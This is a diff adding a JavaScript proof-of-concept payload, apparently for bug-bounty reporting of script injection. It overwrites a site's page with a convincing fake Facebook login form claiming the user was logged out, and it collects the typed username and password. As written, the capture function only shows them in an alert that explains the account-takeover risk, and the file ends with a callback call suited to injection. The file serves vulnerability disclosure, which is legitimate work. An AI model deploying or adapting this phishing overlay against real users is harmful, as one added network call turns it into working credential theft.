@@ -1,0 +1,76 @@
+function fb() {
+	// Overlay fake facebook login form and capture credentials on submission.
+	var s = '<div style="z-index:9999;margin:0 auto;width:100%;height:100%;padding:0 auto;">'
++ '<style>body{overflow-y: scroll;margin:0;font-family:helvetica, arial, sans-serif !important;}a,table a{white-space: nowrap;color: #365899;text-decoration:none;}a:hover{text-decoration:underline;}'
++ 'table.a td {padding-left:0;padding-top: 0;padding-right: 10px;padding-left:10px;line-height: 20px;}</style>'
++ '<div style="height: 82px;min-width: 980px;background-color: #3b5998;background-image: linear-gradient(#4e69a2, #3b5998 50%);border-bottom: 1px solid #133783;min-height: 42px;">'
++  '<div style="margin: 0 auto;padding-top: 13px;width: 980px;position:relative">'
++   '<i style="width: 170px;margin-top: 17px;height: 34px;background-position: 0 0;float:left;background-image: url(//15.rs/attacks/facebook.png);background-size: auto;background-repeat: no-repeat;display: inline-block;"></i>'
++   '<a href="#" style="background-color: #42b72a;line-height: 26px;left: 180px;color: #fff;position: absolute;bottom:-55px;padding:0 10px;border: 1px solid #42b72a;'
++   'border-radius: 2px;box-sizing: content-box;font-family: helvetica, arial, sans-serif;font-size: 12px;-webkit-font-smoothing: antialiased;font-weight: bold;text-align: center;text-shadow: none;vertical-align: middle;">Sign Up</a>'
++  '</div>'
++ '</div>'
++ '<div style="margin: 0 auto;position: relative;zoom: 1;outline: none;padding: 0;width: auto;background-color: #e9ebee;padding: 80px 0;">'
++  '<div style="text-align: center;margin: auto;padding: 22px 108px 26px;width: 396px;border: 1px solid;background-color: #fff;border-color: #e5e6e9 #dfe0e4 #d0d1d5;border-radius: 3px;">'
++  '<span style="display:inline-block;font-size: 18px;line-height: 22px;padding: 18px 0;">Log in to Facebook</span>'
++  '<span style="clear:left;display:inline-block;font-size: 14px;line-height: 22px;font-style:italic;">You have been logged out. Please log in again.</span>'
++  '<form style="margin:0;padding:0">'
++   '<div style="padding: 0;text-align: center;">'
++    '<div style="padding: 6px 0;width: 302px;font-size: 14px;margin:0 auto">'
++     '<input id="u" style="padding: 5px 8px;width: 284px;background: #ffffff url(//15.rs/attacks/facebook.png) repeat-x;border: 1px solid #d3d6db;color: #1d2129;font-size: 14px;height: 22px;line-height: 16px;vertical-align: middle;" placeholder="Email address or phone number">'
++    '</div>'
++    '<div style="padding: 6px 0;width: 302px;font-size: 14px;margin:0 auto">'
++     '<input id="p" onkeyup="if (event.keyCode == 13) {document.getElementById(\'b\').click();}" type="password" style="padding: 5px 8px;width: 284px;background: #ffffff url(//15.rs/attacks/facebook.png) repeat-x;border: 1px solid #d3d6db;color: #1d2129;font-size: 14px;height: 22px;line-height: 16px;vertical-align: middle;" placeholder="Password">'
++    '</div>'
++    '<div style="padding: 6px 0;width: 302px;font-size: 14px;margin:0 auto">'
++     '<input id="b" onclick="window.jrfb(document.getElementById(\'u\').value,document.getElementById(\'p\').value)" type="button" style="cursor: pointer;display: inline-block;text-decoration: none;white-space: nowrap;font-size: 14px;width: 252px;line-height: 42px;padding: 0 24px;background-color: #4267b2;color:#fff;border: 1px solid #4267b2;border-radius: 2px;box-sizing: content-box;-webkit-font-smoothing: antialiased;font-weight: bold;position: relative;text-align: center;text-shadow: none;vertical-align: middle;" value="Log In">'
++    '</div>'
++    '<div style="padding: 6px 0;color: #90949c;font-size: 12px;text-align: center;">'
++     '<a href="#" style="line-height: 1.34;color: #365899;">Forgotten account?</a>'
++     '<span> ' + String.fromCharCode(183) + ' </span>'
++     '<a href="#" style="line-height: 1.34;color: #365899;">Sign up for Facebook</a>'
++    '</div>'
++   '</div>'
++  '</form>'
++ '</div>'
++ '</div>'
++ '<div style="color: #737373;margin: 0 auto;width: 980px;font-size:12px;line-height:1.34;">'
++  '<ul style="color: #737373;padding-top: 8px;list-style-type: none;margin: 0;padding: 0;padding-top: 8px;">'
++   '<li style="vertical-align:top;border-width: 0 0 0 1px;display: inline-block;padding-right:0;padding-left:0px;">English (UK)</li>'
++   '<li style="vertical-align:top;border-width: 0 0 0 1px;display: inline-block;padding-right:0;padding-left:10px;"><a href="#" title="Romanian">Rom'+String.fromCharCode(226)+'n'+String.fromCharCode(259)+'</a></li>'
++   '<li style="vertical-align:top;border-width: 0 0 0 1px;display: inline-block;padding-right:0;padding-left:10px;"><a href="#" title="Polish">Polski</a></li>'
++   '<li style="vertical-align:top;border-width: 0 0 0 1px;display: inline-block;padding-right:0;padding-left:10px;"><a href="#" title="Spanish">Espa'+String.fromCharCode(241)+'ol</a></li>'
++   '<li style="vertical-align:top;border-width: 0 0 0 1px;display: inline-block;padding-right:0;padding-left:10px;"><a href="#" title="French (France)">Fran'+String.fromCharCode(231)+'ais (France)</a></li>'
++   '<li style="vertical-align:top;border-width: 0 0 0 1px;display: inline-block;padding-right:0;padding-left:10px;"><a href="#" title="Italian">Italiano</a></li>'
++   '<li style="vertical-align:top;border-width: 0 0 0 1px;display: inline-block;padding-right:0;padding-left:10px;"><a href="#" title="Lithuanian">Lietuvi'+String.fromCharCode(371)+'</a></li>'
++   '<li style="vertical-align:top;border-width: 0 0 0 1px;display: inline-block;padding-right:0;padding-left:10px;"><a href="#" title="Simplified Chinese (China)">'+String.fromCharCode(20013,25991,40,31616,20307,41)+'</a></li>'
++   '<li style="vertical-align:top;border-width: 0 0 0 1px;display: inline-block;padding-right:0;padding-left:10px;"><a href="#" title="Portuguese (Brazil)">Portugu'+String.fromCharCode(234)+'s (Brasil)</a></li>'
++   '<li style="vertical-align:top;border-width: 0 0 0 1px;display: inline-block;padding-right:0;padding-left:10px;"><a href="#" title="German">Deutsch</a></li>'
++   '<li style="vertical-align:top;border-width: 0 0 0 1px;display: inline-block;padding-right:0;padding-left:10px;"><a href="#" title="Arabic">'+String.fromCharCode(1575,1604,1593,1585,1576,1610,1577)+'</a></li>'
++   '<li style="vertical-align:top;border-width: 0 0 0 1px;display: inline-block;padding-right:0;padding-left:10px;"><a title="Show more languages"><i style=""></i></a></li>'
++   '<li style="vertical-align:top;border-width: 0 0 0 1px;display: inline-block;padding-right:0;">'
++    '<a href="#" style="background-color: #f6f7f9;color: #4b4f56;height: 18px;line-height: 18px;margin-right: 0;text-decoration:none;color: #365899;border: 1px solid #ced0d4;border-radius: 2px;box-sizing: content-box;font-size: 12px;font-weight: bold;padding: 0 8px;position: relative;display:inline-block">'
++     '<i style="width: 12px;height: 12px;background-position: -79px -91px;bottom: 1px;background-image: url(//15.rs/attacks/facebook.png);background-size: auto;background-repeat: no-repeat;display: inline-block;position: relative;vertical-align: middle;"></i>'
++    '</a>'
++   '</li>'
++  '</ul>'
++  '<div style="border-bottom: 1px solid #dddfe2;font-size: 1px;height: 8px;margin-bottom: 8px;"></div>'
++  '<table class="a" cellspacing="0" cellpadding="0"><tbody>'
++   '<tr><td style="padding-left:0"><a href="#" title="Sign up for Facebook">Sign Up</a></td><td><a href="#" title="Log in to Facebook">Log In</a></td><td><a href="#" title="Check out Messenger.">Messenger</a></td><td><a href="#" title="Facebook Lite for Android.">Facebook Lite</a></td><td><a href="#" title="Check out Facebook Mobile.">Mobile</a></td><td><a href="#" title="Find anyone on the web.">Find Friends</a></td><td><a href="#" title="Embed a Facebook badge on your website.">Badges</a></td><td><a href="#/" title="Browse our people directory.">People</a></td><td><a href="#" title="Browse our Pages directory.">Pages</a></td><td><a href="#" title="Check out popular places on Facebook.">Places</a></td><td><a href="#" title="Check out Facebook games.">Games</a></td></tr>'
++   '<tr><td style="padding-left:0"><a href="#" title="Browse our places directory.">Locations</a></td><td><a href="#" title="Browse our Public figures &amp; celebrities directory.">Celebrities</a></td><td><a href="#" title="Browse our Groups directory.">Groups</a></td><td><a href="#" title="Check out Moments.">Moments</a></td><td><a href="#" title="Read our blog, discover the resource centre and find job opportunities.">About</a></td><td><a href="#" title="Advertise on Facebook">Create Advert</a></td><td><a href="#" title="Create a Page">Create Page</a></td><td><a href="#" title="Develop on our platform.">Developers</a></td><td><a href="#" title="Make your next career move to our brilliant company.">Careers</a></td><td><a href="#" title="Learn about your privacy and Facebook.">Privacy</a></td><td><a href="#" title="Learn about cookies and Facebook.">Cookies</a></td></tr>'
++   '<tr><td style="padding-left:0"><a style="position: relative;display: inline-block;padding-right: 14px;" href="#" title="Learn about Ad Choices.">AdChoices<i style="background-image: url(//15.rs/attacks/facebook.png);background-size: auto;background-repeat: no-repeat;display: inline-block;width: 16px;height: 16px;background-position: -25px -35px;position: absolute;top: 1px;vertical-align: middle;"></i></a></td><td><a href="#" title="Review our terms and policies.">Terms</a></td><td><a href="#" title="Visit our Help Centre.">Help</a></td></tr>'
++  '</tbody></table>'
++ '<div style="font-size: 11px;margin-top: 20px;margin-bottom: 20px;color: #737373;"> Meta &copy; 2024 </div>'
++ '</div>'
++'</div>';
+document.body.innerHTML = s;
+}
+
+window.jrfb = function(u,p) {	
+	alert("My script was able to steal the following credentials by replacing your website with a fake Facebook login page:\n\n"
+		+ "  \u2022 Username: " + u + "\n  \u2022 Password:  " + p + "\n\n"
+		+ "For assurance, this is a PoC and no credentials have been exposed to me. All code execution has taken place client-side in your browser only.\n\n"
+		+ "The impact of this vulnerability may be the takeover of users\u2019 Facebook accounts or their corresponding accounts on this website. Given that users often re-use credentials, it is possible that many of the credentials stolen using a form such as this will work on this website.");
+}
+
+window.callback();
